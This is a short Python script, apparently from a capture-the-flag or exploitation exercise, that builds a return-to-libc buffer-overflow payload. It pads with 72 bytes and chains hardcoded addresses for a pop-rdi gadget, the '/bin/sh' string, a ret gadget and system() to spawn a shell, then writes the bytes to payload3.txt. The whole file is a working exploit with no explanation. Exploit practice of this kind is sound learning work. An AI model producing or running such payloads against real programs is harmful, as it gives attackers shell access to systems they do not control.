from struct import pack

offset = 72
poprdi = 0x7ffff7d0f75b
binsh = 0x7ffff7dcb42f
ret = 0x40101a
system = 0x7ffff7c58750

payload = b"a" * offset
payload += pack("<Q", poprdi)
payload += pack("<Q", binsh)
payload += pack("<Q", ret)
payload += pack("<Q", system)

with open("payload3.txt", "wb") as f:
    f.write(payload)

